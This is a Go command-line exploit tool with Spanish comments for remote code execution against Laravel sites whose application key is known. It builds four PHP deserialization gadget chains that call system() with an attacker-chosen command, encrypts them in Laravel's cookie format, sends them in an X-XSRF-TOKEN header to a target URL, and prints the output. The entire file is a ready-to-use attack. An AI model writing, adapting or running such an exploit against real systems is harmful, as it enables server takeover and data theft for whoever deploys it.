package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"io"
	"errors"
	"bytes"
	"os"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

type Payload struct {
	Iv    string `json:"iv"`
	Value string `json:"value"`
	Mac   string `json:"mac"`
}

// generatePayload genera una carga útil codificada en base64 para explotar la vulnerabilidad de Laravel.
// Recibe el comando a ejecutar, la clave de la API codificada en base64 y el método de carga útil a utilizar.
// Devuelve la carga útil codificada en base64.
func generatePayload(cmd string, key string, method int) string {
	var payloadDecoded string
	switch method {
	case 1:
		payloadDecoded = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%s*%sevents";O:15:"Faker\Generator":1:{s:13:"%s*%sformatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"%s*%sevent";s:%d:"%s";}`, "\x00", "\x00", "\x00", "\x00", "\x00", "\x00", len(cmd), cmd)
	case 2:
		payloadDecoded = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%s*%sevents";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"%s*%slisteners";a:1:{s:%d:"%s";a:1:{i:0;s:6:"system";}}}s:8:"%s*%sevent";s:%d:"%s";}`, "\x00", "\x00", "\x00", "\x00", len(cmd), cmd, "\x00", "\x00", len(cmd), cmd)
	case 3:
		payloadDecoded = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"%s*%sevents";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"%s*%sapp";s:%d:"%s";s:17:"%s*%sdefaultChannel";s:1:"x";s:17:"%s*%scustomCreators";a:1:{s:1:"x";s:6:"system";}}}`, "\x00", "\x00", "\x00", "\x00", len(cmd), cmd, "\x00", "\x00", "\x00", "\x00")
	default:
		payloadDecoded = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%s*%sevents";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"%s*%sevent";s:%d:"%s";}`, "\x00", "\x00", "\x00", "\x00", len(cmd), cmd)
	}

	value := base64.StdEncoding.EncodeToString([]byte(payloadDecoded))
	decodedKey, _ := base64.StdEncoding.DecodeString(key)
	encryptedPayload, err := encrypt(value, decodedKey)
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}
	return encryptedPayload
}

// encrypt toma un texto plano y una clave, y devuelve el payload cifrado en base64.
func encrypt(text string, key []byte) (string, error) {
	// Decodificar el texto a cifrar en base64
	decodedText, _ := base64.StdEncoding.DecodeString(text)
	// Crear el bloque de cifrado AES con la clave proporcionada
	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Crear un nuevo vector de inicialización (IV)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	// Añadir relleno PKCS#7 al texto plano
	blockSize := cipherBlock.BlockSize()
	origData := []byte(decodedText)
	pad := blockSize - len(origData)%blockSize
	origData = append(origData, bytes.Repeat([]byte{byte(pad)}, pad)...)

	// Crear el modo de cifrado en bloque CBC
	mode := cipher.NewCBCEncrypter(cipherBlock, iv)

	// Cifrar los datos
	encryptedText := make([]byte, len(origData))
	mode.CryptBlocks(encryptedText, origData)

	// Codificar el texto cifrado y el IV en base64
	payload := base64.StdEncoding.EncodeToString(encryptedText)
	ivBase64 := base64.StdEncoding.EncodeToString(iv)

	// Crear el HMAC usando la clave y los datos cifrados
	hash := hmac.New(sha256.New, key)
	hash.Write([]byte(ivBase64 + payload))
	hashedMac := hash.Sum(nil)

	// Crear la estructura de datos de Payload
	payloadStruct := Payload{Iv: ivBase64, Value: payload, Mac: fmt.Sprintf("%x", hashedMac)}
	jsonData, _ := json.Marshal(payloadStruct)
	payloadEncoded := base64.StdEncoding.EncodeToString(jsonData)
	return payloadEncoded, nil
}


// extractResponse toma la respuesta HTTP recibida y devuelve sólo la parte de la respuesta antes de "<!DOCTYPE html>".
func extractResponse(resp string) string {
	return strings.Split(resp, "<!DOCTYPE html>")[0]
}

// exploit realiza una solicitud HTTP POST a la URL de destino con el payload cifrado.
// El apiKey proporcionado se decodifica en base64 y se utiliza como clave de cifrado.
func exploit(url string, apiKey string, cmd string, method int) (string, error) {
	payload := generatePayload(cmd, apiKey, method)
	if payload == "" {
		return "", errors.New("Failed to generate payload")
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return "", err
	}

	req.Header.Set("X-XSRF-TOKEN", payload)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	// Se definen los flags que se aceptarán en la línea de comandos
	url := flag.String("URL", "", "URL del sitio web de Laravel a atacar")
	apiKey := flag.String("API_KEY", "", "API key del sitio web de Laravel, codificada en base64")
	command := flag.String("command", "uname -a", "Comando a ejecutar en el sitio web vulnerable; si no se especifica, se enviará 'uname -a'")
	method := flag.Int("method", 1, "Indica la versión de carga útil deserializada a usar: 1 = Laravel RCE1 (predeterminada), 2 = Laravel RCE2, 3 = Laravel RCE3, 4 = Laravel RCE4")

	// Agrega la opción -h para imprimir la ayuda de los flags
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	// Ejecuta la función exploit para atacar el sitio web de Laravel especificado
	resp, err := exploit(*url, *apiKey, *command, *method)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Imprime la respuesta obtenida del sitio web vulnerable, eliminando cualquier HTML que pueda haber sido devuelto
	fmt.Println("\n" + extractResponse(resp))
}
